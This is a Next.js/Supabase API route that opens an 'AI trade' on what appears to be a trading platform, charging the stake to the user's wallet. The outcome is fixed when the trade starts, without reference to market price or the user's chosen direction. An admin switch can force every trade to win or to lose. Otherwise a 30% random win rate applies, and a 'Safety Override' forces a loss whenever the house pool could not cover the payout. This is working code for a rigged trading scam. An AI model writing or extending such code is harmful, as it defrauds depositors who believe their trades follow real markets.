import { NextResponse } from "next/server";
import { createClient, supabaseAdmin } from "@/lib/supabase-server";

export async function POST(request: Request) {
  try {
    const supabase = await createClient();
    const { data: { user }, error: authError } = await supabase.auth.getUser();

    if (authError || !user) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }

    const body = await request.json();
    const { amount, direction, assetSymbol, duration = 60, price = 0 } = body;

    if (!amount || amount <= 0) {
      return NextResponse.json({ error: "Invalid amount" }, { status: 400 });
    }

    // 1. Fetch user balance (Using admin to ensure we find it and bypass RLS)
    const { data: wallet, error: walletError } = await supabaseAdmin
      .from("wallets")
      .select("*")
      .eq("user_id", user.id)
      .eq("currency", "trading")
      .single();

    if (walletError || !wallet) throw new Error("Wallet not found");
    if (wallet.main_balance < amount) {
      return NextResponse.json({ error: "Insufficient balance" }, { status: 400 });
    }

    // 2. Calculate House Pool (Admin Profit)
    // House Profit = -1 * (sum of all trade_entry, trade_win, trade_loss amounts)
    const { data: allAiTx } = await supabaseAdmin
      .from("transactions")
      .select("amount")
      .in("type", ["trade_entry", "trade_win", "trade_loss"]);

    const userNetChange = (allAiTx || []).reduce((acc, t) => acc + (t.amount || 0), 0);
    const housePool = -userNetChange;

    const potentialPayout = amount * 1.85; // 85% profit + stake back

    // 3. Check admin-controlled trade mode
    const { data: modeSetting } = await supabaseAdmin
      .from("site_settings")
      .select("value")
      .eq("key", "ai_trade_mode")
      .single();

    const adminMode = modeSetting?.value || "normal";

    // 3a. Determine Outcome
    let isWin: boolean;
    if (adminMode === "always_win") {
      isWin = true;
    } else if (adminMode === "always_loss") {
      isWin = false;
    } else {
      // Normal mode: 30% base win rate
      isWin = Math.random() < 0.3;
      // Safety Override: If house pool is negative or wouldn't cover payout, force loss
      if (housePool < 0 || (isWin && (housePool - (potentialPayout - amount)) < 0)) {
        isWin = false;
      }
    }

    const outcome = isWin ? "WIN" : "LOSS";
    const profit = isWin ? amount * 0.85 : 0;
    const resolvesAt = new Date(Date.now() + duration * 1000).toISOString();
    // 4. Record Trade Entry and Deduct Balance (Using Admin to bypass RLS)
    const { data: trade, error: tradeError } = await supabaseAdmin
      .from("ai_trades")
      .insert({
        user_id: user.id,
        stake: amount,
        direction,
        outcome,
        profit,
        duration,
        resolves_at: resolvesAt,
        entry_price: price || 0, // Ensure numeric value
        status: "pending"
      })
      .select()
      .single();

    if (tradeError) throw tradeError;

    try {
      // Record Transaction (Deduction)
      const { error: txError } = await supabaseAdmin
        .from("transactions")
        .insert({
          user_id: user.id,
          type: "trade_entry",
          amount: -amount,
          symbol: assetSymbol,
          price: price || 0, // Ensure numeric value
          total_value: amount,
          status: "completed"
        });

      if (txError) throw txError;

      // Update Wallet atomically
      const { error: walletUpdateError } = await supabaseAdmin.rpc("adjust_wallet_balance", {
        p_user_id: user.id,
        p_currency: "trading",
        p_amount: -amount,
      });

      if (walletUpdateError) throw walletUpdateError;

      return NextResponse.json({ tradeId: trade.id });
    } catch (cleanupError: any) {
      console.error("Cleanup Error - Rolling back trade:", cleanupError);
      // Manual Rollback: Delete the trade record if subsequent operations fail
      await supabaseAdmin
        .from("ai_trades")
        .delete()
        .eq("id", trade.id);
      
      throw cleanupError;
    }
  } catch (error: any) {
    console.error("AI Trade start error:", error);
    
    // Check for duplicate pending trade constraint
    if (error.code === '23505' && error.message?.includes('ai_trades_one_pending')) {
      return NextResponse.json(
        { error: "You already have an active trade. Please wait for it to resolve." },
        { status: 400 }
      );
    }

    return NextResponse.json(
      { error: error.message || "Failed to start AI trade" },
      { status: 500 }
    );
  }
}
